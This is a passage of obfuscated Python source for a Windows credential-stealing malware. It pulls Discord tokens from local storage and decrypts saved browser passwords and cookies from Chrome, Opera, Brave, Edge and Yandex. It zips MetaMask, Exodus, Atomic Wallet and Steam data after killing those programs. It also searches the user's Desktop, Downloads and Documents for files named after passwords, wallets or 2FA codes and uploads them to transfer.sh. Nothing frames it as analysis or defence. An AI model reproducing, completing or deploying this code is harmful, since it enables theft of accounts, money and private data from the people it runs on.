*   / _  /   ___    ___    ___  | | __ | |_   *
*   \\// /   / _ \\  / _ \\  / __| | |/ / | __|  *
*    / //\\ |  __/ |  __/ | (__  |   <  | |_   *
*   /____/  \\___|  \\___|  \\___| |_|\\_\\  \\__|  *
*                                             *
***********************************************

""")#line:198:""")
		for O00OO0O000OOOO0OO in O0O0OOO00O0000O0O :#line:199:for D in data:
			if O00OO0O000OOOO0OO [0 ]!=B :OOO00OOO0OOOO0OOO .write (f"{O00OO0O000OOOO0OO}\n")#line:200:if D[0]!=B:C.write(f"{D}\n")
R =B #line:201:R=B
def Af (OOOOOO0O00OO000OO ,O0000OOOOO00OO0O0 ):#line:202:def Af(path,arg):
	OOO0OOO0O00OO0000 =OOOOOO0O00OO000OO #line:203:B=path
	if not A .path .exists (OOO0OOO0O00OO0000 ):return #line:204:if not A.path.exists(B):return
	OOO0OOO0O00OO0000 +=O0000OOOOO00OO0O0 #line:205:B+=arg
	for O00000OO0000OO000 in A .listdir (OOO0OOO0O00OO0000 ):#line:206:for D in A.listdir(B):
		if O00000OO0000OO000 .endswith (B1 )or O00000OO0000OO000 .endswith (B2 ):#line:207:if D.endswith(B1)or D.endswith(B2):
			for OOOOO0O0O0OO00O0O in [O00OOOOOO000O0000 .strip ()for O00OOOOOO000O0000 in J (f"{OOO0OOO0O00OO0000}\\{O00000OO0000OO000}",errors =AG ).readlines ()if O00OOOOOO000O0000 .strip ()]:#line:208:for E in [A.strip()for A in J(f"{B}\\{D}",errors=AG).readlines()if A.strip()]:
				for O000OO00O0000OO00 in ('[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}','mfa\\.[\\w-]{80,95}'):#line:209:for F in ('[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}','mfa\\.[\\w-]{80,95}'):
					for OOOOOOO00O0000O0O in re .findall (O000OO00O0000OO00 ,OOOOO0O0O0OO00O0O ):#line:210:for C in re.findall(F,E):
						global R #line:211:global R
						if A8 (OOOOOOO00O0000O0O ):#line:212:if A8(C):
							if not OOOOOOO00O0000O0O in R :R +=OOOOOOO00O0000O0O ;A9 (OOOOOOO00O0000O0O ,OOO0OOO0O00OO0000 )#line:213:if not C in R:R+=C;A9(C,B)
p =[]#line:214:p=[]
def Ag (OO00O0O0OO0OOO000 ,O000O000OO0000O0O ):#line:215:def Ag(path,arg):
	O00OOO000O0OO00OO =OO00O0O0OO0OOO000 ;global p #line:216:E=path;global p
	if not A .path .exists (O00OOO000O0OO00OO ):return #line:217:if not A.path.exists(E):return
	OO0O0O0OO00000O0O =O00OOO000O0OO00OO +O000O000OO0000O0O +'/Login Data'#line:218:I=E+arg+'/Login Data'
	if A .stat (OO0O0O0OO00000O0O ).st_size ==0 :return #line:219:if A.stat(I).st_size==0:return
	OO0000O00OOOO00O0 =k +'wp'+B .join ((A3 .choice (B3 )for O0OO0OO000000OOOO in u (8 )))+B4 ;A2 .copy2 (OO0O0O0OO00000O0O ,OO0000O00OOOO00O0 );O0OOO0000O0O00O00 =z (OO0000O00OOOO00O0 );O0O0OO0000OOOO0O0 =O0OOO0000O0O00O00 .cursor ();O0O0OO0000OOOO0O0 .execute ('SELECT action_url, username_value, password_value FROM logins;');OOOOOO0000O0OOOO0 =O0O0OO0000OOOO0O0 .fetchall ();O0O0OO0000OOOO0O0 .close ();O0OOO0000O0O00O00 .close ();A .remove (OO0000O00OOOO00O0 );OOO00OOO0OO0O0O0O =O00OOO000O0OO00OO +AP #line:220:F=k+'wp'+B.join((A3.choice(B3)for A in u(8)))+B4;A2.copy2(I,F);K=z(F);G=K.cursor();G.execute('SELECT action_url, username_value, password_value FROM logins;');M=G.fetchall();G.close();K.close();A.remove(F);N=E+AP
	with J (OOO00OOO0OO0O0O0O ,'r',encoding =y )as O000O0OOO000OO0O0 :O00O0OO00OO00OO00 =g (O000O0OOO000OO0O0 .read ())#line:221:with J(N,'r',encoding=y)as O:P=g(O.read())
	O00O00O000O0000O0 =a (O00O0OO00OO00OO00 [AQ ][AR ]);O00O00O000O0000O0 =m (O00O00O000O0000O0 [5 :])#line:222:H=a(P[AQ][AR]);H=m(H[5:])
	for O0O000O00OOOO000O in OOOOOO0000O0OOOO0 :#line:223:for C in M:
		if O0O000O00OOOO000O [0 ]!=B :#line:224:if C[0]!=B:
			for OOOO00OOOOO00OO00 in q :#line:225:for D in q:
				OOO0O0000O000O00O =OOOO00OOOOO00OO00 #line:226:L=D
				if x in OOOO00OOOOO00OO00 :OOOO0OO0O00000O0O =OOOO00OOOOO00OO00 ;OOOO00OOOOO00OO00 =OOOO0OO0O00000O0O .split ('[')[1 ].split (']')[0 ]#line:227:if x in D:Q=D;D=Q.split('[')[1].split(']')[0]
				if OOOO00OOOOO00OO00 in O0O000O00OOOO000O [0 ]:#line:228:if D in C[0]:
					if not OOO0O0000O000O00O in s :s .append (OOO0O0000O000O00O )#line:229:if not L in s:s.append(L)
			p .append (f"""
========================
URL: {O0O000O00OOOO000O[0]}
Username: {O0O000O00OOOO000O[1]}
Password: {n(O0O000O00OOOO000O[2],O00O00O000O0000O0)}
========================
""")#line:236:""")
	AA (p ,AS )#line:237:AA(p,AS)
V =[]#line:238:V=[]
def Ah (OO00000OOOO0OOO00 ,OO00OO00000OOO00O ):#line:239:def Ah(path,arg):
	OOOO00O000OO00OO0 =OO00000OOOO0OOO00 ;global V #line:240:E=path;global V
	if not A .path .exists (OOOO00O000OO00OO0 ):return #line:241:if not A.path.exists(E):return
	O0000O0OOOOOOO0OO =OOOO00O000OO00OO0 +OO00OO00000OOO00O +'/Cookies'#line:242:I=E+arg+'/Cookies'
	if A .stat (O0000O0OOOOOOO0OO ).st_size ==0 :return #line:243:if A.stat(I).st_size==0:return
	OOO0O0OO000O0O0O0 =k +'wp'+B .join ((A3 .choice (B3 )for OOOOOO00O0OOOO000 in u (8 )))+B4 ;A2 .copy2 (O0000O0OOOOOOO0OO ,OOO0O0OO000O0O0O0 );OOO0OOOOOO0O0O0OO =z (OOO0O0OO000O0O0O0 );OOOOO0O00O0000O0O =OOO0OOOOOO0O0O0OO .cursor ();OOOOO0O00O0000O0O .execute ('SELECT host_key, name, encrypted_value FROM cookies');OOOOO0O0O00O00000 =OOOOO0O00O0000O0O .fetchall ();OOOOO0O00O0000O0O .close ();OOO0OOOOOO0O0O0OO .close ();A .remove (OOO0O0OO000O0O0O0 );OOO000OO0O00000O0 =OOOO00O000OO00OO0 +AP #line:244:F=k+'wp'+B.join((A3.choice(B3)for A in u(8)))+B4;A2.copy2(I,F);K=z(F);G=K.cursor();G.execute('SELECT host_key, name, encrypted_value FROM cookies');M=G.fetchall();G.close();K.close();A.remove(F);N=E+AP
	with J (OOO000OO0O00000O0 ,'r',encoding =y )as O00OOO0OO000O00O0 :O000O00OOO00OOOOO =g (O00OOO0OO000O00O0 .read ())#line:245:with J(N,'r',encoding=y)as O:P=g(O.read())
	OOO00O000O000O000 =a (O000O00OOO00OOOOO [AQ ][AR ]);OOO00O000O000O000 =m (OOO00O000O000O000 [5 :])#line:246:H=a(P[AQ][AR]);H=m(H[5:])
	for O0000O0OOOO000O00 in OOOOO0O0O00O00000 :#line:247:for C in M:
		if O0000O0OOOO000O00 [0 ]!=B :#line:248:if C[0]!=B:
			for OO0O0O00O000O0O0O in q :#line:249:for D in q:
				OO0OO0O00O0O000OO =OO0O0O00O000O0O0O #line:250:L=D
				if x in OO0O0O00O000O0O0O :OO00O0O0O0OOO0OOO =OO0O0O00O000O0O0O ;OO0O0O00O000O0O0O =OO00O0O0O0OOO0OOO .split ('[')[1 ].split (']')[0 ]#line:251:if x in D:Q=D;D=Q.split('[')[1].split(']')[0]
				if OO0O0O00O000O0O0O in O0000O0OOOO000O00 [0 ]:#line:252:if D in C[0]:
					if not OO0OO0O00O0O000OO in r :r .append (OO0OO0O00O0O000OO )#line:253:if not L in r:r.append(L)
			V .append (f"{O0000O0OOOO000O00[0]}\tTRUE\t/\tFALSE\t2597573456\t{O0000O0OOOO000O00[1]}\t{n(O0000O0OOOO000O00[2],OOO00O000O000O000)}")#line:254:V.append(f"{C[0]}\tTRUE\t/\tFALSE\t2597573456\t{C[1]}\t{n(C[2],H)}")
	AA (V ,'cook')#line:255:AA(V,'cook')
def Ai (O0O0O0000O0OO0OO0 ,O00O00O0O0OOOO00O ):#line:256:def Ai(path,arg):
	O0O0O0OO00OO0OOOO =O0O0O0000O0OO0OO0 #line:257:B=path
	if not A .path .exists (f"{O0O0O0OO00OO0OOOO}/Local State"):return #line:258:if not A.path.exists(f"{B}/Local State"):return
	OO0O00O00OOO000O0 =O0O0O0OO00OO0OOOO +O00O00O0O0OOOO00O ;O0OO00O00O00O0O00 =O0O0O0OO00OO0OOOO +AP #line:259:F=B+arg;G=B+AP
	with J (O0OO00O00O00O0O00 ,'r',encoding =y )as OOOO0OOOOO0O000O0 :OOO000OOOOOO0OO00 =g (OOOO0OOOOO0O000O0 .read ())#line:260:with J(G,'r',encoding=y)as H:I=g(H.read())
	OOO000O0O00O000O0 =a (OOO000OOOOOO0OO00 [AQ ][AR ]);OOO000O0O00O000O0 =m (OOO000O0O00O000O0 [5 :])#line:261:D=a(I[AQ][AR]);D=m(D[5:])
	for O00OOOO0OO0000000 in A .listdir (OO0O00O00OOO000O0 ):#line:262:for E in A.listdir(F):
		if O00OOOO0OO0000000 .endswith (B1 )or O00OOOO0OO0000000 .endswith (B2 ):#line:263:if E.endswith(B1)or E.endswith(B2):
			for OOOO00OOOOO00OOOO in [O0O000O0OO00O0000 .strip ()for O0O000O0OO00O0000 in J (f"{OO0O00O00OOO000O0}\\{O00OOOO0OO0000000}",errors =AG ).readlines ()if O0O000O0OO00O0000 .strip ()]:#line:264:for K in [A.strip()for A in J(f"{F}\\{E}",errors=AG).readlines()if A.strip()]:
				for O000000OO00OOO000 in re .findall ('dQw4w9WgXcQ:[^.*\\[\'(.*)\'\\].*$][^\\"]*',OOOO00OOOOO00OOOO ):#line:265:for L in re.findall('dQw4w9WgXcQ:[^.*\\[\'(.*)\'\\].*$][^\\"]*',K):
					global R ;OO0000O00O0O000OO =n (a (O000000OO00OOO000 .split ('dQw4w9WgXcQ:')[1 ]),OOO000O0O00O000O0 )#line:266:global R;C=n(a(L.split('dQw4w9WgXcQ:')[1]),D)
					if A8 (OO0000O00O0O000OO ):#line:267:if A8(C):
						if not OO0000O00O0O000OO in R :R +=OO0000O00O0O000OO ;A9 (OO0000O00O0O000OO ,O0O0O0OO00OO0OOOO )#line:268:if not C in R:R+=C;A9(C,B)
def AB (O0O00OOOOOOOOOO00 ,O0OO00OO0OOOO00O0 ,OO0OOO0OOO00OO00O ):#line:269:def AB(path,arg,procc):
	OOOOO000000OO00OO =' ';OO00O00OOO00OOO0O =O0O00OOOOOOOOOO00 ;O0OOOO000OO0O0OO0 =O0OO00OO0OOOO00O0 ;OO0O0OO0O000O0OOO =OO00O00OOO00OOO0O ;OO0O00O000O0O0OO0 =O0OOOO000OO0O0OO0 #line:270:R=' ';H=path;E=arg;D=H;G=E
	if 'nkbihfbeogaeaoehlefnkodbefgpgknn'in O0OOOO000OO0O0OO0 :O000000O0O0OOO0O0 =OO00O00OOO00OOO0O .split (AT )[4 ].split (C )[1 ].replace (OOOOO000000OO00OO ,B );OO0O00O000O0O0OO0 =f"Metamask_{O000000O0O0OOO0O0}_{A.getlogin()}";OO0O0OO0O000O0OOO =OO00O00OOO00OOO0O +O0OOOO000OO0O0OO0 #line:271:if'nkbihfbeogaeaoehlefnkodbefgpgknn'in E:I=H.split(AT)[4].split(C)[1].replace(R,B);G=f"Metamask_{I}_{A.getlogin()}";D=H+E
	if not A .path .exists (OO0O0OO0O000O0OOO ):return #line:272:if not A.path.exists(D):return
	A4 .Popen (f"taskkill /im {OO0OOO0OOO00OO00O} /t /f",shell =F )#line:273:A4.Popen(f"taskkill /im {procc} /t /f",shell=F)
	if AU in O0OOOO000OO0O0OO0 or B5 in O0OOOO000OO0O0OO0 :O000000O0O0OOO0O0 =OO00O00OOO00OOO0O .split (AT )[4 ].split (C )[1 ].replace (OOOOO000000OO00OO ,B );OO0O00O000O0O0OO0 =f"{O000000O0O0OOO0O0}_{A.getlogin()}"#line:274:if AU in E or B5 in E:I=H.split(AT)[4].split(C)[1].replace(R,B);G=f"{I}_{A.getlogin()}"
	elif B6 in O0OOOO000OO0O0OO0 :#line:275:elif B6 in E:
		if not A .path .isfile (f"{OO0O0OO0O000O0OOO}/loginusers.vdf"):return #line:276:if not A.path.isfile(f"{D}/loginusers.vdf"):return
		O00O0000O0OO0O00O =J (f"{OO0O0OO0O000O0OOO}/loginusers.vdf",'r+',encoding =Av );OO0O0OO0O00O0O00O =O00O0000O0OO0O00O .readlines ();O0000OOOO00OO0OOO =Q #line:277:N=J(f"{D}/loginusers.vdf",'r+',encoding=Av);O=N.readlines();K=Q
		for OOO00O00000OOOO0O in OO0O0OO0O00O0O00O :#line:278:for P in O:
			if 'RememberPassword"\t\t"1"'in OOO00O00000OOOO0O :O0000OOOO00OO0OOO =F #line:279:if'RememberPassword"\t\t"1"'in P:K=F
		if O0000OOOO00OO0OOO ==Q :return #line:280:if K==Q:return
		OO0O00O000O0O0OO0 =O0OOOO000OO0O0OO0 #line:281:G=E
	OOO00O00OOOOO0OO0 =ZipFile (f"{OO0O0OO0O000O0OOO}/{OO0O00O000O0O0OO0}.zip",'w')#line:282:L=ZipFile(f"{D}/{G}.zip",'w')
	for O0O00OOO00O0O0O0O in A .listdir (OO0O0OO0O000O0OOO ):#line:283:for M in A.listdir(D):
		if not '.zip'in O0O00OOO00O0O0O0O :OOO00O00OOOOO0OO0 .write (OO0O0OO0O000O0OOO +C +O0O00OOO00O0O0O0O )#line:284:if not'.zip'in M:L.write(D+C+M)
	OOO00O00OOOOO0OO0 .close ();o (f"{OO0O0OO0O000O0OOO}/{OO0O00O000O0O0OO0}.zip");A .remove (f"{OO0O0OO0O000O0OOO}/{OO0O00O000O0O0OO0}.zip")#line:285:L.close();o(f"{D}/{G}.zip");A.remove(f"{D}/{G}.zip")
def Aj ():#line:286:def Aj():
	O0O00OOOOOO0OO0O0 ='chrome.exe';O0OOOO0OO00O0O00O ='/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn';O0000OOO00O0O0000 ='/Network';O0O000O0OOOO00OO0 ='opera.exe';OO00OO0OO00O00OOO ='/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn';O00OOO0OO0OO00000 ='/Default/Network';OO000OOOOOO0OOO0O ='/Default';O00OO00OOOOO0OO00 ='/Default/Local Storage/leveldb';O0OO0O0O0OO0000O0 ='/Local Storage/leveldb';OO00O0O000OOOO0OO =[[f"{E}/Opera Software/Opera GX Stable",O0O000O0OOOO00OO0 ,O0OO0O0O0OO0000O0 ,C ,O0000OOO00O0O0000 ,O0OOOO0OO00O0O00O ],[f"{E}/Opera Software/Opera Stable",O0O000O0OOOO00OO0 ,O0OO0O0O0OO0000O0 ,C ,O0000OOO00O0O0000 ,O0OOOO0OO00O0O00O ],[f"{E}/Opera Software/Opera Neon/User Data/Default",O0O000O0OOOO00OO0 ,O0OO0O0O0OO0000O0 ,C ,O0000OOO00O0O0000 ,O0OOOO0OO00O0O00O ],[f"{U}/Google/Chrome/User Data",O0O00OOOOOO0OO0O0 ,O00OO00OOOOO0OO00 ,OO000OOOOOO0OOO0O ,O00OOO0OO0OO00000 ,OO00OO0OO00O00OOO ],[f"{U}/Google/Chrome SxS/User Data",O0O00OOOOOO0OO0O0 ,O00OO00OOOOO0OO00 ,OO000OOOOOO0OOO0O ,O00OOO0OO0OO00000 ,OO00OO0OO00O00OOO ],[f"{U}/BraveSoftware/Brave-Browser/User Data",'brave.exe',O00OO00OOOOO0OO00 ,OO000OOOOOO0OOO0O ,O00OOO0OO0OO00000 ,OO00OO0OO00O00OOO ],[f"{U}/Yandex/YandexBrowser/User Data",'yandex.exe',O00OO00OOOOO0OO00 ,OO000OOOOOO0OOO0O ,O00OOO0OO0OO00000 ,'/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn'],[f"{U}/Microsoft/Edge/User Data",'edge.exe',O00OO00OOOOO0OO00 ,OO000OOOOOO0OOO0O ,O00OOO0OO0OO00000 ,OO00OO0OO00O00OOO ]];OOOO0OO0OOO00OO00 =[[f"{E}/Discord",O0OO0O0O0OO0000O0 ],[f"{E}/Lightcord",O0OO0O0O0OO0000O0 ],[f"{E}/discordcanary",O0OO0O0O0OO0000O0 ],[f"{E}/discordptb",O0OO0O0O0OO0000O0 ]];OO0OO0O0000O00OOO =[[f"{E}/atomic/Local Storage/leveldb",'"Atomic Wallet.exe"',AU ],[f"{E}/Exodus/exodus.wallet",'Exodus.exe',AU ],['C:\\Program Files (x86)\\Steam\\config','steam.exe',B6 ],[f"{E}/NationsGlory/Local Storage/leveldb",'NationsGlory.exe',B5 ]]#line:287:Y='chrome.exe';R='/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn';Q='/Network';P='opera.exe';N='/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn';K='/Default/Network';J='/Default';I='/Default/Local Storage/leveldb';G='/Local Storage/leveldb';H=[[f"{E}/Opera Software/Opera GX Stable",P,G,C,Q,R],[f"{E}/Opera Software/Opera Stable",P,G,C,Q,R],[f"{E}/Opera Software/Opera Neon/User Data/Default",P,G,C,Q,R],[f"{U}/Google/Chrome/User Data",Y,I,J,K,N],[f"{U}/Google/Chrome SxS/User Data",Y,I,J,K,N],[f"{U}/BraveSoftware/Brave-Browser/User Data",'brave.exe',I,J,K,N],[f"{U}/Yandex/YandexBrowser/User Data",'yandex.exe',I,J,K,'/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn'],[f"{U}/Microsoft/Edge/User Data",'edge.exe',I,J,K,N]];S=[[f"{E}/Discord",G],[f"{E}/Lightcord",G],[f"{E}/discordcanary",G],[f"{E}/discordptb",G]];T=[[f"{E}/atomic/Local Storage/leveldb",'"Atomic Wallet.exe"',AU],[f"{E}/Exodus/exodus.wallet",'Exodus.exe',AU],['C:\\Program Files (x86)\\Steam\\config','steam.exe',B6],[f"{E}/NationsGlory/Local Storage/leveldb",'NationsGlory.exe',B5]]
	for O00O0000OO0O000O0 in OO00O0O000OOOO0OO :O0OO00OO0OO0000OO =M .Thread (target =Af ,args =[O00O0000OO0O000O0 [0 ],O00O0000OO0O000O0 [2 ]]);O0OO00OO0OO0000OO .start ();b .append (O0OO00OO0OO0000OO )#line:288:for B in H:D=M.Thread(target=Af,args=[B[0],B[2]]);D.start();b.append(D)
	for O00O0000OO0O000O0 in OOOO0OO0OOO00OO00 :O0OO00OO0OO0000OO =M .Thread (target =Ai ,args =[O00O0000OO0O000O0 [0 ],O00O0000OO0O000O0 [1 ]]);O0OO00OO0OO0000OO .start ();b .append (O0OO00OO0OO0000OO )#line:289:for B in S:D=M.Thread(target=Ai,args=[B[0],B[1]]);D.start();b.append(D)
	for O00O0000OO0O000O0 in OO00O0O000OOOO0OO :O0OO00OO0OO0000OO =M .Thread (target =Ag ,args =[O00O0000OO0O000O0 [0 ],O00O0000OO0O000O0 [3 ]]);O0OO00OO0OO0000OO .start ();b .append (O0OO00OO0OO0000OO )#line:290:for B in H:D=M.Thread(target=Ag,args=[B[0],B[3]]);D.start();b.append(D)
	O00O000OO0O0OOO00 =[]#line:291:O=[]
	for O00O0000OO0O000O0 in OO00O0O000OOOO0OO :O0OO00OO0OO0000OO =M .Thread (target =Ah ,args =[O00O0000OO0O000O0 [0 ],O00O0000OO0O000O0 [4 ]]);O0OO00OO0OO0000OO .start ();O00O000OO0O0OOO00 .append (O0OO00OO0OO0000OO )#line:292:for B in H:D=M.Thread(target=Ah,args=[B[0],B[4]]);D.start();O.append(D)
	for O0O0O00OOO0OOOO00 in O00O000OO0O0OOO00 :O0O0O00OOO0OOOO00 .join ()#line:293:for L in O:L.join()
	O0OO00OOOO00O0O00 =A7 (V )#line:294:W=A7(V)
	if O0OO00OOOO00O0O00 ==F :return #line:295:if W==F:return
	for O00O0000OO0O000O0 in OO00O0O000OOOO0OO :M .Thread (target =AB ,args =[O00O0000OO0O000O0 [0 ],O00O0000OO0O000O0 [5 ],O00O0000OO0O000O0 [1 ]]).start ()#line:296:for B in H:M.Thread(target=AB,args=[B[0],B[5],B[1]]).start()
	for O00O0000OO0O000O0 in OO0OO0O0000O00OOO :M .Thread (target =AB ,args =[O00O0000OO0O000O0 [0 ],O00O0000OO0O000O0 [2 ],O00O0000OO0O000O0 [1 ]]).start ()#line:297:for B in T:M.Thread(target=AB,args=[B[0],B[2],B[1]]).start()
	for O0O0O00OOO0OOOO00 in b :O0O0O00OOO0OOOO00 .join ()#line:298:for L in b:L.join()
	global Ak ;Ak =[]#line:299:global Ak;Ak=[]
	for O00O00000O00OO0O0 in ['wppassw.txt','wpcook.txt']:o (A .getenv (AF )+AT +O00O00000O00OO0O0 )#line:300:for X in ['wppassw.txt','wpcook.txt']:o(A.getenv(AF)+AT+X)
def AC (OOOOO0O0OOO0O00O0 ):#line:301:def AC(path):
	try :O000OOOOOOO00O0OO ={B0 :(OOOOO0O0OOO0O00O0 ,J (OOOOO0O0OOO0O00O0 ,mode ='rb'))};...;OOO0OOOOO0O0OO000 =O .post ('https://transfer.sh/',files =O000OOOOOOO00O0OO );O0OOO000O00O0OO00 =OOO0OOOOO0O0OO000 .text ;return O0OOO000O00O0OO00 #line:302:try:A={B0:(path,J(path,mode='rb'))};...;B=O.post('https://transfer.sh/',files=A);C=B.text;return C
	except :return Q #line:303:except:return Q
def Al (O0O0O0OO0O0000OO0 ,OO00000OO0OOO00O0 ):#line:304:def Al(pathF,keywords):
	OO00O0O0O0O0OO0O0 =O0O0O0OO0O0000OO0 ;global W ;O00OOOO0O0O0O00O0 =7 ;O0OO0OO00OOO0O0OO =0 ;O000000000O00000O =A .listdir (OO00O0O0O0O0OO0O0 );OOOO00000OO00000O =[]#line:305:B=pathF;global W;G=7;E=0;H=A.listdir(B);F=[]
	for OO0OO0OOOOO0O000O in O000000000O00000O :#line:306:for D in H:
		if not A .path .isfile (OO00O0O0O0O0OO0O0 +C +OO0OO0OOOOO0O000O ):return #line:307:if not A.path.isfile(B+C+D):return
		O0OO0OO00OOO0O0OO +=1 #line:308:E+=1
		if O0OO0OO00OOO0O0OO <=O00OOOO0O0O0O00O0 :O0000OO00OO00OO00 =AC (OO00O0O0O0O0OO0O0 +C +OO0OO0OOOOO0O000O );OOOO00000OO00000O .append ([OO00O0O0O0O0OO0O0 +C +OO0OO0OOOOO0O000O ,O0000OO00OO00OO00 ])#line:309:if E<=G:I=AC(B+C+D);F.append([B+C+D,I])
		else :break #line:310:else:break
	W .append ([B7 ,OO00O0O0O0O0OO0O0 +C ,OOOO00000OO00000O ])#line:311:W.append([B7,B+C,F])
W =[]#line:312:W=[]
def Am (O00OOO00O0OOOOOOO ,OOO00O0OOO00000OO ):#line:313:def Am(path,keywords):
	O00O000OO0OOOOO0O =OOO00O0OOO00000OO ;OO0O00OOO00OOOOOO =O00OOO00O0OOOOOOO ;global W ;O00OOO000O00000O0 =[];OOO0000O00O0OOOOO =A .listdir (OO0O00OOO00OOOOOO )#line:314:E=keywords;B=path;global W;F=[];G=A.listdir(B)
	for O0000O0000OO00OO0 in OOO0000O00O0OOOOO :#line:315:for D in G:
		for O0O0O00O0OO000000 in O00O000OO0OOOOO0O :#line:316:for H in E:
			if O0O0O00O0OO000000 in O0000O0000OO00OO0 .lower ():#line:317:if H in D.lower():
				if A .path .isfile (OO0O00OOO00OOOOOO +C +O0000O0000OO00OO0 )and '.txt'in O0000O0000OO00OO0 :O00OOO000O00000O0 .append ([OO0O00OOO00OOOOOO +C +O0000O0000OO00OO0 ,AC (OO0O00OOO00OOOOOO +C +O0000O0000OO00OO0 )]);break #line:318:if A.path.isfile(B+C+D)and'.txt'in D:F.append([B+C+D,AC(B+C+D)]);break
				if A .path .isdir (OO0O00OOO00OOOOOO +C +O0000O0000OO00OO0 ):OOO000OO0O0OOO0OO =OO0O00OOO00OOOOOO +C +O0000O0000OO00OO0 ;Al (OOO000OO0O0OOO0OO ,O00O000OO0OOOOO0O );break #line:319:if A.path.isdir(B+C+D):I=B+C+D;Al(I,E);break
	W .append ([B7 ,OO0O00OOO00OOOOOO ,O00OOO000O00000O0 ])#line:320:W.append([B7,B,F])
def An ():#line:321:def An():
	OOOOO000O00OOOOO0 ='secret';OOO00OOO00O00O000 ='acount';OOOO0OO000OOO000O ='account';O0OOOOOOOOOO0O0OO =k .split ('\\AppData')[0 ];OOO0000O0OOOO000O =[O0OOOOOOOOOO0O0OO +'/Desktop',O0OOOOOOOOOO0O0OO +'/Downloads',O0OOOOOOOOOO0O0OO +'/Documents'];O0000OO0O0O0O0000 =[OOOO0OO000OOO000O ,OOO00OOO00O00O000 ,AS ,OOOOO000O00OOOOO0 ];OOOOOO00OOOOO0O00 =[AS ,'mdp','motdepasse','mot_de_passe','login',B8 ,OOOOO000O00OOOOO0 ,OOOO0OO000OOO000O ,OOO00OOO00O00O000 ,'paypal','banque',OOOO0OO000OOO000O ,'metamask','wallet',B9 ,'exodus','discord','2fa','code','memo','compte',Ay ,'backup','tokens','seecret'];OO0O0O00000OOOOO0 =[]#line:322:I='secret';H='acount';D='account';A=k.split('\\AppData')[0];E=[A+'/Desktop',A+'/Downloads',A+'/Documents'];J=[D,H,AS,I];F=[AS,'mdp','motdepasse','mot_de_passe','login',B8,I,D,H,'paypal','banque',D,'metamask','wallet',B9,'exodus','discord','2fa','code','memo','compte',Ay,'backup','tokens','seecret'];B=[]
	for OO00O00000OOO0O0O in OOO0000O0OOOO000O :OOOOO0OO000O000O0 =M .Thread (target =Am ,args =[OO00O00000OOO0O0O ,OOOOOO00OOOOO0O00 ]);OOOOO0OO000O000O0 .start ();OO0O0O00000OOOOO0 .append (OOOOO0OO000O000O0 )#line:323:for G in E:C=M.Thread(target=Am,args=[G,F]);C.start();B.append(C)
	return OO0O0O00000OOOOO0 #line:324:return B
global q ,r ,s #line:325:global q,r,s
q =['mail','nft',B8 ,'[exodus](https://exodus.com)','[coinbase](https://coinbase.com)','[github](https://github.com)','[stake](https://stake.com)','[sellix](https://sellix.io)','[gmail](https://gmail.com)','[steam](https://steam.com)','[discord](https://discord.com)','[riotgames](https://riotgames.com)','[youtube](https://youtube.com)','[instagram](https://instagram.com)','[tiktok](https://tiktok.com)','[twitter](https://twitter.com)','[facebook](https://facebook.com)','card','[epicgames](https://epicgames.com)','[spotify](https://spotify.com)','[yahoo](https://yahoo.com)','[roblox](https://roblox.com)','[twitch](https://twitch.com)','[minecraft](https://minecraft.net)','bank','[paypal](https://paypal.com)','[origin](https://origin.com)','[amazon](https://amazon.com)','[ebay](https://ebay.com)','[aliexpress](https://aliexpress.com)','[playstation](https://playstation.com)','[hbo](https://hbo.com)','[xbox](https://xbox.com)','buy','sell','[binance](https://binance.com)','[hotmail](https://hotmail.com)','[outlook](https://outlook.com)','[crunchyroll](https://crunchyroll.com)','[telegram](https://telegram.com)','[pornhub](https://pornhub.com)','[disney](https://disney.com)','[expressvpn](https://expressvpn.com)',B9 ,'[uber](https://uber.com)','[netflix](https://netflix.com)']#line:326:q=['mail','nft',B8,'[exodus](https://exodus.com)','[coinbase](https://coinbase.com)','[github](https://github.com)','[stake](https://stake.com)','[sellix](https://sellix.io)','[gmail](https://gmail.com)','[steam](https://steam.com)','[discord](https://discord.com)','[riotgames](https://riotgames.com)','[youtube](https://youtube.com)','[instagram](https://instagram.com)','[tiktok](https://tiktok.com)','[twitter](https://twitter.com)','[facebook](https://facebook.com)','card','[epicgames](https://epicgames.com)','[spotify](https://spotify.com)','[yahoo](https://yahoo.com)','[roblox](https://roblox.com)','[twitch](https://twitch.com)','[minecraft](https://minecraft.net)','bank','[paypal](https://paypal.com)','[origin](https://origin.com)','[amazon](https://amazon.com)','[ebay](https://ebay.com)','[aliexpress](https://aliexpress.com)','[playstation](https://playstation.com)','[hbo](https://hbo.com)','[xbox](https://xbox.com)','buy','sell','[binance](https://binance.com)','[hotmail](https://hotmail.com)','[outlook](https://outlook.com)','[crunchyroll](https://crunchyroll.com)','[telegram](https://telegram.com)','[pornhub](https://pornhub.com)','[disney](https://disney.com)','[expressvpn](https://expressvpn.com)',B9,'[uber](https://uber.com)','[netflix](https://netflix.com)']
r =[]#line:327:r=[]
s =[]#line:328:s=[]
Aj ()#line:329:Aj()
N =A7 (V )#line:330:N=A7(V)
if not N :#line:331:if not N:
	Ao =An ()#line:332:Ao=An()
	for Ap in Ao :Ap .join ()#line:333:for Ap in Ao:Ap.join()
	time .sleep (0.2 );c ='\n'#line:334:time.sleep(0.2);c='\n'
	for t in W :#line:335:for t in W:
		if P (t [2 ])!=0 :#line:336:if P(t[2])!=0:
			Aq =t [1 ];Ar =t [2 ];c +=f"• {Aq}\n"#line:337:Aq=t[1];Ar=t[2];c+=f"• {Aq}\n"
			for AD in Ar :AE =AD [0 ].split (C );As =AE [P (AE )-1 ];At =AD [1 ];c +=f"... [{As}]({At})\n"#line:338:for AD in Ar:AE=AD[0].split(C);As=AE[P(AE)-1];At=AD[1];c+=f"... [{As}]({At})\n"
			c +='\n'#line:339:c+='\n'
	o (A_ ,c )
